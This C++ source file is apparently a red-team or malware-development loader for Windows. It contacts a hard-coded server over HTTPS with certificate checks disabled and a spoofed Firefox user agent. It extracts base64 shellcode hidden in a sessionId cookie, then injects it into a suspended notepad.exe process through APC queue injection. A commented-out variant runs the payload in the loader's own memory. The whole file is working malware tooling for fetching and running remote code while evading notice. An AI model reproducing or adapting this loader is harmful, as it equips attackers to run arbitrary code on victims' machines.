/*
 * Copyright (c) 2025 Sayan Ray
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included
 * in all copies or substantial portions of the Software.
 *
 * Redistribution of this file, in source or binary form, with or without
 * modification, is permitted provided that the above notice is retained.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
 * EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES
 * OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
 * IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,
 * DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
 * ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 * OTHER DEALINGS IN THE SOFTWARE.
 */


#include <iostream>
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")

#define SERVER_IP "192.168.51.75"
#define SERVER_PORT 8080
#define ENDPOINT "/api"
#define REMOTE_FILE "payload.bin"

// Decode Base64 -> Raw Bytes

BOOL Base64Decode(const char* base64, BYTE** output, DWORD* outLen) {
    DWORD len = 0;
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, NULL, &len, NULL, NULL))
        return FALSE;

    // reserve the storage for *output into heap
    *output = (BYTE*)malloc(len);

    // outputs the raw bytes into the *output
    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64, *output, &len, NULL, NULL))
        return FALSE;

    *outLen = len;
    return TRUE;
}

// Execute
// void ExecuteBytes(unsigned char *buffer, int buf_len)
// {
// 	// Allocate some memory
//     void *mem = VirtualAlloc(0, buf_len, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);

//     // Copy the bytes there
//     memcpy(mem, buffer, buf_len);

//     // Change the memory protections
//     DWORD oldProtect;
//     VirtualProtect(mem, buf_len, PAGE_EXECUTE_READ, &oldProtect);

//     // Execute the memory segment
//     ((void(*)())mem)();
// }
void ExecuteBytes(unsigned char *buffer, int buf_len)
{
	STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};

    CreateProcessA("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE hProcess = pi.hProcess;
    HANDLE hThread = pi.hThread;
    
    LPVOID memory = VirtualAllocEx(hProcess, NULL, buf_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)memory;
    
    WriteProcessMemory(hProcess, memory, buffer, buf_len, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, 0);    
    ResumeThread(hThread);
}

// HTTPS Client
int ConnectHost(LPCSTR hostname, INTERNET_PORT port, LPCSTR endpoint, LPCSTR n)
{
	std::string name = n;

	LPCWSTR userAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0";
	
	// Initialize the session
	HINTERNET hInternet = InternetOpenW(userAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (hInternet == NULL) {
		perror("InternetOpenW");
		exit(EXIT_FAILURE);
	}

	// Connect to the server
	HINTERNET hConnect = InternetConnect(hInternet, hostname, port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	if (hConnect == NULL) {
		InternetCloseHandle(hInternet);
		perror("InternetConnect");
		exit(EXIT_FAILURE);
	}

	// Craft the accept header
	PCTSTR accept[] = {"application/json", NULL};

	// Open the SSL Secured Request
	HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", endpoint, "HTTP/1.1", NULL, accept, INTERNET_FLAG_SECURE, 0);

	if (hRequest == NULL) {
		InternetCloseHandle(hInternet);
		InternetCloseHandle(hConnect);
		perror("HttpOpenRequest");
		exit(EXIT_FAILURE);
	}

	// Disable SSL Certificate validation
	DWORD flags;
	DWORD size = sizeof(flags);

	if (InternetQueryOptionW(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, &size) == true) {
		flags |= SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
				 SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
				 SECURITY_FLAG_IGNORE_UNKNOWN_CA |
				 SECURITY_FLAG_IGNORE_WEAK_SIGNATURE;

		InternetSetOptionW(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
	}

	// Add the Content-Type header
	std::string headers = "Content-Type: application/json\r\n";

	if (HttpAddRequestHeaders(hRequest, headers.c_str(), -1L, HTTP_ADDREQ_FLAG_ADD) == false) {
		InternetCloseHandle(hInternet);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
		perror("HttpAddRequestHeaders");
		exit(EXIT_FAILURE);
	}

	// Craft and send the POST data
	std::string data = "{\"file\": \"" + name + "\"}";

	if (HttpSendRequest(hRequest, NULL, -1L, (LPVOID) data.c_str(), data.length()) == false) {
		InternetCloseHandle(hInternet);
		InternetCloseHandle(hConnect);
		InternetCloseHandle(hRequest);
		perror("HttpSendRequest");
		exit(EXIT_FAILURE);
	}

	std::cout << "[+] Sending Request ..." << std::endl;

	// Get Set-Cookie header
    DWORD dwSize = 0;
    HttpQueryInfoA(hRequest, HTTP_QUERY_SET_COOKIE, NULL, &dwSize, NULL);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "No Set-Cookie found." << std::endl;
        return 1;
    }

    char* cookieData = (char*)malloc(dwSize);
    if (!HttpQueryInfoA(hRequest, HTTP_QUERY_SET_COOKIE, cookieData, &dwSize, NULL)) {
        std::cerr << "Failed to get Set-Cookie." << std::endl;
        return 1;
    }

    std::cout << "[+] Got cookie!!" << std::endl;

    // Extract sessionId base64 value
    const char* key = "sessionId=";
    const char* start = strstr(cookieData, key);
    if (!start) {
        std::cout << "sessionId not found in cookie." << std::endl;
        return 1;
    }

    start += strlen(key);
    const char* end = strchr(start, ';');
    int len = end ? (end - start) : strlen(start);

    char base64Value[512] = {0};
    strncpy(base64Value, start, len);

    // Decode Base64 to raw bytes
    BYTE* raw = NULL;
    DWORD rawLen = 0;
    if (!Base64Decode(base64Value, &raw, &rawLen)) {
        std::cerr << "Base64 decode failed." << std::endl;
        return 1;
    }

    std::cout << "[+] Cookie Decoded!!" << std::endl;

    ExecuteBytes(raw, rawLen);

    // Read the response message

	// std::string response = "";

	// char buffer[4096];
	// DWORD bytesRead;
	// while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
	// 	buffer[bytesRead] = '\0';
	// 	response += buffer;
	// }

    // Print the response message

	// std::cout << response << std::endl;

	InternetCloseHandle(hInternet);
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hRequest);
	return 0;
}

int main() {
    ConnectHost(SERVER_IP, SERVER_PORT, ENDPOINT, REMOTE_FILE);
    return 0;
}
